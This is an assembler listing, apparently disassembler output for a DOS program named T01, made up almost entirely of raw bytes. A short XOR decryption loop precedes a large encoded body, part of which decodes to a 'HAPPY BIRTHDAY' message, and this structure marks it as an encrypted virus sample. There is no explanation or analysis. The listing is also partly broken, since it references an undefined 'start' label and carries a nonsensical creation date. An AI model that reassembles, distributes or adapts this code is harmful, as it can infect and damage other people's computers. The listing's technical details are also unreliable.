
PAGE  59,132

;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
;лл					                                 лл
;лл				T01	                                 лл
;лл					                                 лл
;лл      Created:   1-Jan-100		                                 лл
;лл      Passes:    5          Analysis	Options on: none                 лл
;лл					                                 лл
;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл

target		EQU   'T3'                      ; Target assembler: TASM-3.2

include  srmacros.inc


;------------------------------------------------------------  seg_a   ----

seg_a		segment	byte public
		assume cs:seg_a  , ds:seg_a , ss:stack_seg_b

		db	 1Eh, 33h,0C0h, 50h,0CBh
		db	11 dup (82h)

seg_a		ends



;------------------------------------------------------  stack_seg_b   ----

stack_seg_b	segment	word stack 'STACK'

		db	0EAh,0A3h, 00h, 73h, 13h, 43h
		db	 2Dh, 00h,0BCh,0AEh, 08h, 0Eh
		db	 1Fh,0A0h, 05h, 00h,0EBh, 02h
		db	 10h, 02h,0B9h, 50h, 06h,0BEh
		db	 34h, 00h,0EBh, 02h, 00h, 00h
		db	 30h, 04h, 46h,0E2h,0FBh,0B8h
		db	0A3h, 00h,0A3h, 01h, 00h,0EBh
		db	 02h, 20h, 00h, 8Ch, 0Eh, 03h
		db	 00h,0EBh,0CDh, 90h
		db	43h
		db	8 dup (7Ch)
		db	 06h, 1Bh, 06h, 43h, 44h, 43h
		db	 15h,0ECh
		db	'CCCC@CCCCFC@GCCCC'
		db	0C0h, 03h, 71h, 43h, 57h, 4Ch
		db	 16h, 42h, 43h, 43h, 6Dh, 85h
		db	 45h, 1Ch, 43h, 2Ah,0F3h, 43h
		db	 8Ch,0A9h, 43h, 43h, 43h, 43h
		db	0C7h, 42h, 03h,0DCh, 61h, 43h
		db	 49h, 4Eh, 19h, 0Bh, 02h, 0Dh
		db	 04h, 05h, 02h
		db	0Dh, 'yININcccc'
		db	 0Bh, 02h, 13h, 13h, 1Ah, 63h
		db	 01h, 0Ah, 11h, 17h, 0Bh, 07h
		db	 02h, 1Ah, 63h, 17h, 0Ch, 63h
		db	 1Ah, 0Ch, 16h
		db	'bININDge'
		db	0C8h, 55h, 41h, 43h,0C2h,0A9h
		db	 83h, 43h, 4Dh, 5Ch,0FBh,0C7h
		db	 42h,0E0h, 2Dh, 43h,0CAh, 55h
		db	 33h, 43h, 70h, 83h,0CDh, 83h
		db	 65h,0E2h,0C7h, 43h,0E0h, 15h
		db	 43h, 65h,0E2h,0C5h, 43h,0E0h
		db	 1Bh, 43h, 65h,0E2h,0D3h, 43h
		db	0E0h, 1Fh, 43h, 65h,0E2h,0D1h
		db	 43h,0E0h, 19h, 43h,0F7h,0ACh
		db	 8Eh, 62h, 7Fh,0ACh, 37h, 18h
		db	0C0h, 45h, 45h, 43h, 42h,0CDh
		db	 45h, 33h, 43h,0FDh, 43h, 43h
		db	 70h,0BCh,0FAh, 13h, 45h,0BFh
		db	0B0h,0E7h, 70h,0B5h,0F7h, 12h
		db	 8Eh, 62h, 08h,0CDh, 98h,0C2h
		db	 2Fh, 51h, 83h, 43h,0CDh, 98h
		db	0C3h, 7Fh, 19h, 36h, 50h,0C9h
		db	 37h, 47h,0C9h, 17h, 40h,0C2h
		db	0A9h, 83h, 43h,0CBh, 17h, 40h
		db	0CBh, 37h, 47h,0A8h, 4Fh,0D3h
		db	0C9h, 37h, 47h,0C9h, 17h, 40h
		db	 40h, 99h, 00h,0A8h, 98h, 4Dh
		db	 5Ch, 70h, 83h,0CDh, 83h,0E2h
		db	 33h, 43h, 65h,0E0h,0C5h, 43h
		db	0E2h, 2Dh, 43h, 65h,0E0h,0C7h
		db	 43h, 4Dh, 5Ch,0C3h, 7Dh, 46h
		db	 43h, 43h, 37h, 78h,0F7h, 12h
		db	 8Eh, 62h, 10h, 4Dh, 5Ch, 42h
		db	 5Dh, 11h, 43h,0C0h, 45h, 11h
		db	 43h, 53h, 42h, 5Dh, 2Fh, 43h
		db	0C0h, 45h, 2Fh, 43h, 53h, 70h
		db	 83h, 70h, 98h, 70h, 8Ah, 70h
		db	 91h, 70h,0B5h, 70h,0BCh, 70h
		db	0AEh, 1Bh,0CDh, 9Bh,0CDh, 83h
		db	 6Dh,0CDh, 55h, 11h, 43h, 6Dh
		db	0C8h, 65h, 17h, 43h, 70h, 83h
		db	0AAh,0A9h,0BDh,0FBh, 43h, 0Fh
		db	 8Eh, 62h, 13h, 10h, 12h, 11h
		db	 15h, 14h, 45h, 5Dh,0DFh,0C3h
		db	0BFh, 75h, 37h, 04h,0C3h,0BFh
		db	 7Ah, 37h, 2Ah,0C3h,0BFh, 79h
		db	 37h, 27h,0C3h,0BFh, 15h, 37h
		db	 1Ch,0C3h,0BFh, 18h, 37h, 78h
		db	0C3h,0BFh, 02h, 37h, 16h,0C3h
		db	0BFh, 7Fh, 37h, 72h,0C3h,0BFh
		db	 50h, 37h, 08h,0C3h,0BFh, 2Fh
		db	 37h, 77h,0C3h,0BFh,0ACh, 37h
		db	 4Dh,0DEh, 5Ch, 44h, 1Ch, 1Dh
		db	 19h, 1Ah, 18h, 1Bh, 6Dh,0BCh
		db	 6Dh, 15h, 43h,0DEh, 5Ch, 44h
		db	 1Ch, 1Dh, 19h, 1Ah, 18h, 1Bh
		db	0F3h,0ACh, 8Ch, 6Dh,0CBh, 55h
		db	 77h, 43h,0A8h, 65h,0D3h,0C8h
		db	0B1h,0C9h, 47h, 6Fh, 03h, 6Dh
		db	0E1h, 77h, 43h,0A8h, 5Ah,0D3h
		db	0C3h,0B8h, 62h, 37h, 41h,0A8h
		db	 89h,0C9h, 47h, 6Fh, 03h, 6Dh
		db	0E1h, 77h, 43h,0A8h, 44h,0D3h
		db	 6Dh, 85h
		db	'EwCCM\MD'
		db	 85h, 45h, 12h, 43h, 47h,0F7h
		db	 69h,0DFh,0BCh, 5Dh, 15h, 43h
		db	0C2h,0B9h, 5Eh, 47h, 36h, 5Ah
		db	0E3h, 1Dh, 43h,0BDh, 45h, 1Dh
		db	 43h, 4Fh,0B3h, 77h,0B3h, 7Fh
		db	 49h, 36h, 49h,0F9h, 37h, 43h
		db	0F7h, 4Ah,0DFh,0BCh, 5Dh, 15h
		db	 43h,0FBh, 67h, 76h,0DFh,0BCh
		db	 5Dh, 15h, 43h,0CFh, 45h, 19h
		db	 43h,0CAh, 5Dh, 1Fh, 43h,0FBh
		db	 67h, 66h,0F9h, 23h, 43h,0DFh
		db	0BCh, 5Dh, 15h, 43h, 4Dh, 44h
		db	 4Dh, 5Ch,0F9h, 84h, 47h,0F7h
		db	 59h,0DFh,0BCh, 5Dh, 15h, 43h
		db	0F9h, 77h, 43h,0F7h, 52h,0DFh
		db	0BCh, 5Dh, 15h, 43h, 7Fh,0BCh
		db	 37h, 41h,0A8h, 40h,0AAh, 7Fh
		db	 41h,0FDh, 84h, 47h,0C9h, 47h
		db	0E1h, 13h, 43h, 47h, 03h,0E1h
		db	0A2h, 47h, 85h, 45h,0A1h, 47h
		db	 79h, 85h, 45h,0A0h, 47h, 1Fh
		db	0C9h, 55h, 13h, 43h,0FDh,0A7h
		db	 47h,0F7h, 04h,0DFh,0BCh, 5Dh
		db	 15h, 43h,0FCh,0A7h, 47h,0F3h
		db	 43h,0FAh, 03h, 43h,0B1h,0EDh
		db	0C8h,0B4h,0C3h, 3Fh,0BDh, 1Fh
		db	 37h, 41h,0A8h, 40h, 0Ch,0A8h
		db	 47h, 85h, 07h,0BCh, 1Fh,0FDh
		db	 8Bh, 47h,0FAh, 4Bh, 43h,0BFh
		db	0B0h,0E7h,0C8h,0B4h, 85h, 47h
		db	 6Dh, 85h, 07h, 42h, 06h, 85h
		db	 07h, 41h, 1Bh, 85h, 07h, 40h
		db	 06h, 85h, 07h, 47h, 43h,0FBh
		db	 41h, 7Eh,0F9h,0A2h, 47h,0DFh
		db	0BCh, 5Dh, 15h, 43h, 31h, 41h
		db	0A8h, 40h,0AAh,0F8h, 42h,0E0h
		db	 0Dh, 43h,0FBh, 41h, 01h,0C8h
		db	 5Dh, 0Dh, 43h, 70h, 8Ah, 70h
		db	 91h,0DFh,0BCh, 5Dh, 15h, 43h
		db	0C3h,0B9h, 4Bh, 30h, 1Fh,0E0h
		db	 51h, 43h,0F2h, 4Fh, 90h,0A1h
		db	0CAh, 55h, 5Fh, 43h,0FBh, 43h
		db	 01h,0C8h, 5Dh, 0Dh, 43h, 70h
		db	 8Ah, 70h, 91h,0DFh,0BCh, 5Dh
		db	 15h, 43h,0F9h, 84h, 47h,0C8h
		db	 5Dh, 0Dh, 43h,0FAh, 63h, 43h
		db	0F7h, 7Ch,0DFh,0BCh, 5Dh, 15h
		db	 43h,0FDh, 84h, 47h,0C2h, 3Fh
		db	 53h, 25h, 39h, 37h, 65h,0C3h
		db	 3Fh, 5Bh, 03h, 37h, 63h,0C8h
		db	 07h, 4Bh,0E0h, 68h, 43h,0C8h
		db	 07h, 4Dh,0E0h, 11h, 43h,0C8h
		db	 07h, 53h,0E0h, 17h, 43h,0C8h
		db	 07h, 57h,0E0h, 29h, 43h,0C8h
		db	 07h, 55h,0E0h, 2Fh, 43h,0A8h
		db	 4Dh,0C8h, 5Dh, 0Dh, 43h,0F7h
		db	 7Dh,0DFh,0BCh, 5Dh, 15h, 43h
		db	0AAh, 7Ah, 42h,0F7h, 6Fh,0DFh
		db	0BCh, 5Dh, 15h, 43h, 41h,0B1h
		db	0C3h,0BDh, 43h, 37h,0B1h,0CBh
		db	 75h, 46h, 43h,0E2h, 51h, 43h
		db	 4Eh,0B3h,0BCh, 76h,0B3h,0BCh
		db	0FDh, 53h, 43h, 68h,0B3h, 42h
		db	 75h, 51h, 43h, 15h,0C3h, 45h
		db	 4Ah, 43h, 41h,0FCh, 67h, 46h
		db	 40h,0BDh, 70h,0B5h,0FAh, 13h
		db	 45h,0BFh,0B0h,0E7h,0FDh, 67h
		db	 46h, 1Ah, 40h,0B2h,0FBh, 77h
		db	 43h,0FAh, 13h, 45h, 40h,0B3h
		db	 68h, 8Bh,0E3h, 46h, 43h, 73h
		db	 47h, 05h,0A1h,0B8h,0FBh, 41h
		db	 01h, 70h, 8Ah, 70h, 91h,0DFh
		db	0BCh, 5Dh, 15h, 43h,0F9h, 67h
		db	 46h,0C8h, 5Dh, 0Dh, 43h,0FAh
		db	 43h, 41h,0F7h, 03h,0DFh,0BCh
		db	 5Dh, 15h, 43h,0DFh,0C3h, 7Dh
		db	 1Ch, 43h, 2Ah, 37h, 57h,0DEh
		db	0F9h, 67h, 44h,0C8h, 5Dh, 0Dh
		db	 43h,0FAh,0BCh, 40h,0F7h, 03h
		db	0DFh,0BCh, 5Dh, 15h, 43h,0A8h
		db	 4Ch,0DEh,0C8h, 5Dh, 0Dh, 43h
		db	0F7h, 7Dh,0DFh,0BCh, 5Dh, 15h
		db	 43h,0AAh,0F0h, 43h,0FBh, 43h
		db	 01h, 70h, 8Ah, 70h, 91h,0DFh
		db	0BCh, 5Dh, 15h, 43h,0F9h, 84h
		db	 47h,0C8h, 5Dh, 0Dh, 43h,0FAh
		db	 63h, 43h,0F7h, 7Ch,0DFh,0BCh
		db	 5Dh, 15h, 43h,0E2h, 51h, 43h
		db	0F2h, 47h, 90h,0ABh,0C8h, 75h
		db	 5Fh, 43h, 40h,0B3h,0CAh, 75h
		db	 31h, 43h,0C0h, 85h, 4Ah,0FAh
		db	 40h, 43h,0C0h,0BDh, 63h, 31h
		db	 45h,0C0h,0ADh, 63h, 02h,0A8h
		db	0B6h,0C8h, 92h,0C8h, 85h,0F2h
		db	 47h, 90h,0A3h,0FDh, 84h, 47h
		db	 84h, 07h, 53h, 25h, 39h,0CAh
		db	 17h, 47h,0CAh, 07h, 41h, 84h
		db	 07h, 57h, 4Bh, 43h,0E2h, 31h
		db	 43h, 68h, 45h, 68h, 43h,0CAh
		db	 07h, 55h,0CAh, 07h, 4Dh,0FBh
		db	 43h, 01h, 70h, 8Ah, 70h, 91h
		db	0DFh,0BCh, 5Dh, 15h, 43h,0F9h
		db	 84h, 47h,0C8h, 5Dh, 0Dh, 43h
		db	0FAh, 63h, 43h,0F7h, 03h,0DFh
		db	0BCh, 5Dh, 15h, 43h,0C8h, 5Dh
		db	 0Dh, 43h,0F7h, 7Dh,0DFh,0BCh
		db	 5Dh, 15h, 43h,0C3h, 7Dh, 13h
		db	 43h, 41h, 35h, 5Eh,0C3h, 7Dh
		db	 12h, 43h, 43h, 37h, 55h,0C3h
		db	 6Dh, 12h, 43h, 42h,0F9h, 77h
		db	 43h,0F7h, 51h,0DFh,0BCh, 5Dh
		db	 15h, 43h, 7Fh,0BCh, 37h, 40h
		db	0AAh, 87h,0BEh, 85h, 45h, 1Ch
		db	 43h, 43h,0CDh, 5Dh, 19h, 43h
		db	 6Dh,0C8h, 55h, 1Fh, 43h,0FBh
		db	 67h, 66h,0DFh, 6Dh,0BCh, 5Dh
		db	 15h, 43h,0AAh,0BBh,0BFh, 0Eh
		db	 19h
		db	'FCACCCcCBC'
		db	0BCh,0BCh
		db	10 dup (43h)
		db	 7Dh, 43h, 43h, 43h, 42h, 43h
		db	0B8h, 13h, 1Fh, 15h, 0Ah, 11h
		db	 16h, 10h, 1Fh, 17h, 0Ch, 0Dh
		db	 04h, 09h, 0Ah, 1Fh, 17h
		db	'srcccccm'
		db	 06h, 1Bh, 06h, 43h, 1Ah, 63h
		db	 6Dh, 06h, 1Bh, 06h, 43h, 47h
		db	0CDh,0ABh, 87h, 2Fh, 37h, 01h
		db	31 dup (0C1h)
		db	0A9h,0E0h, 43h, 30h, 50h, 00h
		db	 6Eh, 43h,0FFh,0EDh, 4Bh, 4Dh
		db	 5Ch,0E3h, 46h, 43h,0A8h, 41h
		db	 53h, 41h,0FAh, 13h, 45h,0FDh
		db	 77h, 43h,0A8h, 41h, 43h, 43h
		db	 73h, 47h, 05h,0A1h,0B8h,0FBh
		db	0E0h, 43h,0E0h, 42h, 43h,0A8h
		db	 41h, 63h, 43h,0CFh, 4Dh, 40h
		db	 43h,0A8h, 8Eh,0D3h
		db	43h
		db	8 dup (7Ch)
		db	 06h, 1Bh, 06h, 43h, 44h, 43h
		db	 15h,0ECh
		db	'CCCC@CCCCFC@GCCCC'
		db	0C0h, 03h, 71h, 43h, 57h, 4Ch
		db	 16h, 42h, 43h, 43h, 6Dh, 85h
		db	 45h, 1Ch, 43h, 2Ah,0F3h, 43h
		db	 8Ch,0A9h, 43h, 43h, 43h, 43h
		db	0C7h, 42h, 03h,0DCh, 61h, 43h
		db	 49h, 4Eh, 19h, 0Bh, 02h, 0Dh
		db	 04h, 05h, 02h
		db	0Dh, 'yININcccc'
		db	 0Bh, 02h, 13h, 13h, 1Ah, 63h
		db	 01h, 0Ah, 11h, 17h, 0Bh, 07h
		db	 02h, 1Ah, 63h, 17h, 0Ch, 63h
		db	 1Ah, 0Ch, 16h
		db	'bININDge'
		db	0C8h, 55h, 41h, 43h,0C2h,0A9h
		db	 83h, 43h, 4Dh, 5Ch,0FBh,0C7h
		db	 42h,0E0h, 2Dh, 43h,0CAh, 55h
		db	 33h, 43h, 70h, 83h,0CDh, 83h
		db	 65h,0E2h,0C7h, 43h,0E0h
		db	29814 dup (0)

stack_seg_b	ends



		end	start
